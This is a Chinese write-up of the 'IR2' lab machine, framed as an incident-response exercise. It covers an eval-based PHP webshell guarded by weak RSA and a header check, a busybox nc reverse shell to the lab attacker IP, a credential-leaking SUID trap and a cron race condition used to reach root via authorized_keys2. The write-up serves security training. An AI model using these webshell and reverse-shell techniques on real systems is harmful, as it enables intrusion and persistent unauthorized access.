# IR2 靶机复盘：弱 RSA 后门到竞态提权

> 本文记录的是隔离环境中的授权靶机复盘。WebShell 利用、后门交互与提权验证均不可用于未授权系统。
>
> 作者 ftasy。IR2 是 IR1 的续作，改编自真实应急：一代被清理后，攻击者用更隐蔽的加密后门再次进入，并留下多处权限维持与诱饵。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | IR2 / Alpine Linux |
| 作者 | ftasy |
| 目标地址 | 192.168.134.68 |
| 攻击机 | 192.168.134.4 |
| Web 栈 | Apache 2.4.68 + PHP 8.3.32（伪装 IIS 首页） |
| 开放端口 | 22/tcp、80/tcp |
| 最终路径 | 目录枚举 → ZWCQA RSA 后门 → apache Shell → bd 泄露凭据 → SSH IR2 → safeguard 竞态 → root |

![靶机地址与环境](/content/ir2/image-01.png)

## 1. 攻击链概览

二代看起来很像一代：假 IIS 页、假上传页、熟悉的 `ZWCQA` 名字。真正的变化在后门加密、请求头校验，以及提权窗口被故意压短。

```text
nmap + 目录枚举
  → /uqloads/ZWCQA.txt 源码泄露 + /upload/ZWCQA.php 静默后门
  → 弱 RSA(e=937,d=193,n=737) + 参数 A + Accept-Encoding 校验
  → apache RCE / 反弹 Shell
  → /opt/bd（SUID）猜对 C2 → 攻击者主页 → IR2 口令
  → SSH 登录 IR2，写入 authorized_keys2
  → safeguard cron：海量小文件拉长拷贝窗口
  → 抢窗 ssh root
```

## 2. 枚举：假 IIS 与一堆兔笼

```bash
nmap -sT -sV -sC -O -p- 192.168.134.68
```

只开放 22 与 80。首页仍是伪造的 IIS 默认页，实际是 Apache。

![IR2 伪造 IIS 首页](/content/ir2/image-02.png) ![首页与一代对照线索](/content/ir2/image-03.png)

目录扫描后，结构比一代多了 `/backup/`、`/uploads/` 一类路径：

![目录枚举结果](/content/ir2/image-04.png) ![backup / uploads 等路径](/content/ir2/image-05.png)

关键命中与陷阱：

| 路径 | 说明 |
|------|------|
| `/upload/ZWCQA.php` | 静默后门，200，无参数几乎无输出 |
| `/uqloads/ZWCQA.txt` | **后门源码泄露**（注意是 `uqloads`，不是 `uploads`） |
| `/upload.php` 等上传页 | 兔笼：看起来能上传，实际不保存 |
| `/backup/` 里的上传脚本 | 多数是假的；有的只回显路径线索 |
| `iisstart.png` | 一代藏了图片马；二代是干净图 |
| `/cgi-bin/printenv` | 源码可见，不是主线 |

> 作者设定：真实事件里攻击者会把后门淹没在大量相似文件中；文件上传点当初是真的，被改掉之后，残存后门仍然可用。

## 3. 利用：弱 RSA 加密 WebShell

`/uqloads/ZWCQA.txt` 泄露了旧版后门逻辑：用硬编码弱 RSA 解密参数 `A`，再 `eval`。目录名和常见的 `/uploads/` 几乎一样，只差一个字母；这次复盘里我一开始也没找到这份 txt，是对照作者 WP 才定位到的。

![ZWCQA.txt 后门源码泄露](/content/ir2/image-06.png)

核心逻辑可以概括为：

```php
$ObjRSA->b1();              // a1=937, a2=193, a3=737
$paramName = chr(65);       // "A"
$g1 = $ObjRSA->b4($_REQUEST[$paramName]);
eval($g1);
```

模数 `737 = 11 × 67`，`φ(737)=660`，`937×193 ≡ 1 (mod 660)`，数学上合法，但强度等于没有。

![弱 RSA 参数分析](/content/ir2/image-09.png) ![加密参数与请求构造](/content/ir2/image-10.png)

线上部署版比泄露 txt 多了一层请求头校验：

```php
if (strpos($_SERVER['HTTP_ACCEPT_ENCODING'] ?? '', 'gzip, deflate') === false) exit;
```

没有这组 `Accept-Encoding`，后门直接静默退出，响应上也几乎分不出对错。客户端需要：

1. 把 PHP payload 按字符做 `pow(ord(c), 937, 737)`，拼成 4 位十六进制；
2. POST 到 `/upload/ZWCQA.php`，参数名 `A`；
3. 带上 `Accept-Encoding: gzip, deflate`。

![作者提供的利用脚本/思路](/content/ir2/image-07.png) ![RCE 验证](/content/ir2/image-11.png)

RSA 参数、请求头校验和利用写法，这次主要是跟着作者 WP 走通的；自己盲测时很容易卡在“请求发出去了却完全没回显”上。

确认命令执行身份为 `apache` 后，反弹 Shell：

```bash
# 攻击机
nc -lvnp 4444

# 通过加密后门触发（示例）
busybox nc 192.168.134.4 4444 -e /bin/bash
```

![获得 apache 反弹 Shell](/content/ir2/image-08.png)

> 复盘说明：RSA 细节、参数名与请求头校验，实战中若只靠盲测成本极高；泄露 txt 只能当旧样本，必须以线上行为为准。

## 4. 凭据：bd 与攻击者主页

枚举 SUID 时会看到 `/opt/bd`。交互运行后它并不直接给 root，而是要求输入 `C2ip:C2port`：

```text
Please enter C2ip:C2port. You have 5 attempts...
```

![发现 bd SUID 挑战](/content/ir2/image-12.png)

正确 C2 为 `223.5.5.5:6666`（与环境中其他持久化痕迹一致）。猜对后它会“不小心”泄露攻击者个人主页：

```text
https://textshare.online/d7a610/
```

![猜对 C2 后泄露主页](/content/ir2/image-13.png) ![主页内容线索](/content/ir2/image-14.png)

页面内容是一段 base64：

```text
SVIyOkhlcmVJY29tZWFnYWlu
→ IR2:HereIcomeagain
```

![base64 解码得到 IR2 口令](/content/ir2/image-15.png)

据此 SSH 登录：

```bash
ssh IR2@192.168.134.68
# HereIcomeagain
```

user flag：`flag{user-4e79af9d9b43464228ae1100839a2575}`

> 重要陷阱：提示写“失败 5 次会失去重要东西”，实际是随机 `2~4` 次就 `remove("/root/root.txt")`。我试 bd 的时候就把 root flag 删掉了，后面只能从作者记录侧把值补回来。

## 5. 提权：safeguard 竞态拉长窗口

IR2 用户的 `authorized_keys` 已被占用（攻击者留下嘲讽）。可用 `authorized_keys2`：

```bash
mkdir -p /home/IR2/.ssh
echo 'ssh-ed25519 AAAA...' > /home/IR2/.ssh/authorized_keys2
chmod 700 /home/IR2/.ssh
chmod 600 /home/IR2/.ssh/authorized_keys2
```

root 每分钟执行的 `safeguard.sh` 会把 `/home/IR2` 整树拷到 `/root/`，再清理 `/root` 下不该留下的文件。一代有 `sleep 15`；二代删掉了 sleep，窗口极短。

![safeguard 定时任务](/content/ir2/image-17.png)

做法是先在家目录堆大量小文件，让拷贝/删除变慢，再在 Kali 侧循环抢 `root` 的密钥登录窗口：

```bash
touch /home/IR2/f{1..5000}
```

![用海量小文件拉长拷贝窗口](/content/ir2/image-16.png)

当 `/root/.ssh/authorized_keys2` 短暂存在时：

```bash
ssh -i id_ed25519 root@192.168.134.68
```

即可进入 root。root flag：`flag{root-61d6a94b034d47096ac282d5de618e5f}`（本次被 bd 误删后，从作者记录恢复）。

根密码线索：`seeyouoncemore`（相对一代的 `seeyou_nexttime`）。

提权思路同样参考了作者 WP / 群里提示：二代删掉 sleep 后，要用大批量小文件把拷贝窗口重新拉出来。

## 6. 与 IR1 的对照

| 维度 | IR1 | IR2 |
|------|-----|-----|
| 初始后门 | 图片马 + 字符串混淆 | 弱 RSA + `Accept-Encoding` 校验 |
| 源码线索 | 图片分离 / 目录浏览 | `/uqloads/ZWCQA.txt`（目录名易看错） |
| 凭据 | 扫描日志 | bd → 攻击者主页 → base64 |
| 提权 | safeguard + sleep 窗口 | sleep 被删，靠海量文件拉窗口 |
| 额外诱饵 | 较少 | 假上传、`bd`、`bbsuid`、MSF 痕迹 |

## 7. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| 源码泄露 ≠ 线上版本 | txt 无头校验，php 有；必须以实际请求验证 |
| 相似目录名 | `uploads` / `uqloads` 差一个字母就够绕 |
| SUID 不一定能提权 | `bd` 是凭据题，也是惩罚性陷阱 |
| 多后门思维 | 应急不要假设攻击者只有一个入口 |
| 竞态提权 | 删 sleep 后，用 I/O 压力把毫秒窗口拉到秒级 |

## 8. 作者的话

小提示：

1. uqload 是真实事件，细小差异赌一手应急人员看不见，其他把后门淹没在服务器众多文件里面。
2. 该后门当时过了 D 盾。
3. jar 模拟真实发生的后门，不过给了简单的后门木马，为 msf 木马。
4. bd 描述 5 次试错机会，但实际上 2–4 次随机删除，因为黑客可不会跟你讲道理，没处理好的话黑客可能看着你应急。
5. 文件上传本来是真的，被改了。真实攻防也是上了别人遗留的后门就改密码。

IR1 是 IR2 的延续，为了权限维持，攻击者做了一些混淆开发运维人员视听的操作，包括高度混淆的后门和看起来很像的文件。IR1 是通过文件上传攻击的，运维简单修复漏洞后又上线了系统，没想到攻击者同时做了两种加解密方式的后门，第二次连上了残存的后门（该后门当时过了静态查杀的安全设备），并且还有其他恶意病毒外联，系统二次下线。于是运维和业主单位终于决定让专业人员上机排查。

IR2 靶机里面很多长得很像的文件上传文件，其实是开发运维众多备份文件里的各种上传点，但这些都有可能成为攻击者的后门，攻击者可以随意修改文件。另外权限维持的方式有很多，多后门是其中一种。初始对抗分析可以参考：https://www.52pojie.cn/thread-2090008-1-1.html

应急就是永远不要以为攻击者只有一个后门。靶机内提示输错了 5 次会失去重要的东西，实际上攻击者并不会跟你讲规矩，所以设定了随机 2–4 次就删除，希望大家思维不要那么固定。感谢群主提供的提权思路，感谢各位参与，希望大家玩得开心。下一台靶机难度将会继续进阶。

## 9. 复盘

这次是对照作者 WP 走通的，不算独立打穿。

差得最明显的两处：一是 `ZWCQA.txt` 一开始没找到，卡在 `uploads` / `uqloads` 这种细小差异上；二是试 `bd` 的时候把 root flag 删了——提示写 5 次，实际 2–4 次就动手，正好踩中作者想强调的那点。

RCE 细节和提权窗口思路也主要靠 WP / 提示补齐。收获更多是把“二次入侵 + 多后门 + 不讲规矩的陷阱”这条故事线串清楚，而不是证明自己已经能脱离题解复现。下一步还是得练：源码泄露先自己抠，SUID 先想清楚会不会惩罚，再动手。
